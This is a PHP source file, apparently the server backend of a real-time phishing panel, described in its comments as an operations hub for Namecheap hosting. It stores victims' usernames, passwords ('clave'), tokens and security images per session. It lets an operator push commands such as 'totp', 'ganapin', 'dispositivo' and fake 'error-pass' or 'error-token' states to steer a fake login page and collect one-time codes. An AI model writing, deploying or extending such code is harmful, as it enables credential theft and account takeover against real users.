<?php
/**
 * Hub de operaciones para Namecheap (reemplaza opsHubPlugin de Vite).
 * Rutas: /api/ops/sessions|actions|token|ping|session
 */

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(204);
  exit;
}

function json_out($status, $data) {
  http_response_code($status);
  header('Content-Type: application/json; charset=utf-8');
  echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
  exit;
}

function read_json_body() {
  $raw = file_get_contents('php://input');
  if ($raw === false || $raw === '') return [];
  $data = json_decode($raw, true);
  return is_array($data) ? $data : [];
}

function data_dir() {
  $dir = __DIR__ . DIRECTORY_SEPARATOR . 'data';
  if (!is_dir($dir)) {
    @mkdir($dir, 0755, true);
  }
  return $dir;
}

function store_path() {
  return data_dir() . DIRECTORY_SEPARATOR . 'hub.json';
}

function default_store() {
  return [
    'sessions' => new stdClass(), // will encode as {}
    'actions' => [],
    'actionSeq' => 0,
  ];
}

function load_store($fp) {
  rewind($fp);
  $raw = stream_get_contents($fp);
  if ($raw === false || trim($raw) === '') {
    return [
      'sessions' => [],
      'actions' => [],
      'actionSeq' => 0,
    ];
  }
  $data = json_decode($raw, true);
  if (!is_array($data)) {
    return [
      'sessions' => [],
      'actions' => [],
      'actionSeq' => 0,
    ];
  }
  if (!isset($data['sessions']) || !is_array($data['sessions'])) $data['sessions'] = [];
  if (!isset($data['actions']) || !is_array($data['actions'])) $data['actions'] = [];
  if (!isset($data['actionSeq'])) $data['actionSeq'] = 0;
  return $data;
}

function save_store($fp, $store) {
  // Keep last 400 actions to bound file size
  if (count($store['actions']) > 400) {
    $store['actions'] = array_slice($store['actions'], -400);
  }
  $json = json_encode($store, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
  ftruncate($fp, 0);
  rewind($fp);
  fwrite($fp, $json);
  fflush($fp);
}

function with_store($mutator) {
  $path = store_path();
  $fp = fopen($path, 'c+');
  if (!$fp) {
    json_out(500, ['error' => 'cannot open store']);
  }
  try {
    if (!flock($fp, LOCK_EX)) {
      json_out(500, ['error' => 'cannot lock store']);
    }
    $store = load_store($fp);
    $result = $mutator($store);
    save_store($fp, $store);
    flock($fp, LOCK_UN);
    fclose($fp);
    return $result;
  } catch (Throwable $e) {
    flock($fp, LOCK_UN);
    fclose($fp);
    json_out(500, ['error' => $e->getMessage()]);
  }
}

function route_path() {
  // Prefer rewrite query, then PATH_INFO, then URL path after /api/ops
  if (!empty($_GET['r'])) {
    return trim((string)$_GET['r'], '/');
  }
  if (!empty($_SERVER['PATH_INFO'])) {
    return trim((string)$_SERVER['PATH_INFO'], '/');
  }
  $uri = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
  $uri = $uri ?: '';
  if (preg_match('#/api/ops(?:/index\\.php)?/?(.*)$#', $uri, $m)) {
    return trim($m[1], '/');
  }
  return '';
}

$route = route_path();
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// ---------- sessions ----------
if ($route === 'sessions' && $method === 'GET') {
  $out = with_store(function (&$store) {
    $list = array_values($store['sessions']);
    usort($list, function ($a, $b) {
      return ($a['createdAt'] ?? 0) <=> ($b['createdAt'] ?? 0);
    });
    return ['sessions' => $list];
  });
  json_out(200, $out);
}

if ($route === 'sessions' && $method === 'POST') {
  $body = read_json_body();
  if (empty($body['id'])) json_out(400, ['error' => 'id required']);
  $out = with_store(function (&$store) use ($body) {
    $id = $body['id'];
    $prev = $store['sessions'][$id] ?? [];
    $username = $body['username'] ?? $body['user'] ?? ($prev['username'] ?? '');
    $password = $body['password'] ?? $body['clave'] ?? ($prev['password'] ?? '');
    $next = array_merge($prev, $body, [
      'id' => $id,
      'username' => $username,
      'password' => $password,
      'user' => $username,
      'clave' => $password,
      'createdAt' => $body['createdAt'] ?? ($prev['createdAt'] ?? (int) round(microtime(true) * 1000)),
      'last_seen' => $body['last_seen'] ?? (int) round(microtime(true) * 1000),
      'updatedAt' => (int) round(microtime(true) * 1000),
      'state' => $body['state'] ?? ($body['status'] ?? ($prev['state'] ?? 'waiting')),
      'token' => array_key_exists('token', $body) ? $body['token'] : ($prev['token'] ?? ''),
    ]);
    $store['sessions'][$id] = $next;
    return ['ok' => true, 'session' => $next];
  });
  json_out(200, $out);
}

if ($route === 'sessions' && $method === 'DELETE') {
  with_store(function (&$store) {
    $store['sessions'] = [];
    $store['actions'] = [];
    $store['actionSeq'] = 0;
    return true;
  });
  json_out(200, ['ok' => true]);
}

// ---------- single session delete ----------
if ($route === 'session' && $method === 'DELETE') {
  $body = read_json_body();
  $id = $body['id'] ?? ($body['sessionId'] ?? null);
  if (!$id) json_out(400, ['error' => 'id required']);
  with_store(function (&$store) use ($id) {
    unset($store['sessions'][$id]);
    return true;
  });
  json_out(200, ['ok' => true]);
}

// ---------- ping ----------
if ($route === 'ping' && $method === 'POST') {
  $body = read_json_body();
  $sid = $body['sessionId'] ?? null;
  with_store(function (&$store) use ($sid) {
    if ($sid && isset($store['sessions'][$sid])) {
      $now = (int) round(microtime(true) * 1000);
      $store['sessions'][$sid]['last_seen'] = $now;
      $store['sessions'][$sid]['updatedAt'] = $now;
    }
    return true;
  });
  json_out(200, ['ok' => true]);
}

// ---------- token ----------
if ($route === 'token' && $method === 'POST') {
  $body = read_json_body();
  $sid = $body['sessionId'] ?? null;
  with_store(function (&$store) use ($body, $sid) {
    if ($sid && isset($store['sessions'][$sid])) {
      $now = (int) round(microtime(true) * 1000);
      $s = &$store['sessions'][$sid];
      $s['last_seen'] = $now;
      $s['updatedAt'] = $now;
      if (!empty($body['typingOnly'])) {
        if (($s['state'] ?? '') !== 'waiting-token' && ($s['state'] ?? '') !== 'done') {
          $s['state'] = 'typing';
        }
      } else {
        $s['token'] = $body['token'] ?? '';
        $s['state'] = !empty($body['submitted']) ? 'waiting-token' : 'typing';
      }
    }
    return true;
  });
  json_out(200, ['ok' => true]);
}

// ---------- actions ----------
if ($route === 'actions' && $method === 'POST') {
  $body = read_json_body();
  if (empty($body['sessionId']) || empty($body['action'])) {
    json_out(400, ['error' => 'sessionId and action required']);
  }
  $out = with_store(function (&$store) use ($body) {
    $store['actionSeq'] = ((int)$store['actionSeq']) + 1;
    $now = (int) round(microtime(true) * 1000);
    $entry = [
      'id' => 'a_' . $store['actionSeq'] . '_' . $now,
      'sessionId' => $body['sessionId'],
      'action' => $body['action'],
      'image' => isset($body['image']) && is_string($body['image']) ? $body['image'] : '',
      'at' => $now,
    ];
    $store['actions'][] = $entry;
    $sid = $body['sessionId'];
    if (isset($store['sessions'][$sid])) {
      $map = [
        'ganapin' => 'waiting-ganapin',
        'totp' => 'waiting-totp',
        'dispositivo' => 'waiting-dispositivo',
        'error-pass' => 'error-pass',
        'error-user' => 'error-user',
        'error-token' => 'error-token',
        'done' => 'done',
      ];
      $action = $body['action'];
      $store['sessions'][$sid]['state'] = $map[$action] ?? $action;
      if ($entry['image'] !== '') {
        $store['sessions'][$sid]['securityImage'] = $entry['image'];
      }
      $store['sessions'][$sid]['updatedAt'] = $now;
    }
    return ['ok' => true, 'action' => $entry];
  });
  json_out(200, $out);
}

if ($route === 'actions' && $method === 'GET') {
  $sessionId = $_GET['sessionId'] ?? null;
  $since = isset($_GET['since']) ? (float)$_GET['since'] : 0;
  $out = with_store(function (&$store) use ($sessionId, $since) {
    $list = [];
    foreach ($store['actions'] as $a) {
      if (($a['at'] ?? 0) <= $since) continue;
      if ($sessionId && ($a['sessionId'] ?? '') !== $sessionId) continue;
      $list[] = [
        'id' => $a['id'] ?? '',
        'sessionId' => $a['sessionId'] ?? '',
        'action' => $a['action'] ?? '',
        'image' => '',
        'at' => $a['at'] ?? 0,
      ];
    }
    return ['actions' => $list];
  });
  json_out(200, $out);
}

json_out(404, ['error' => 'not found', 'route' => $route]);
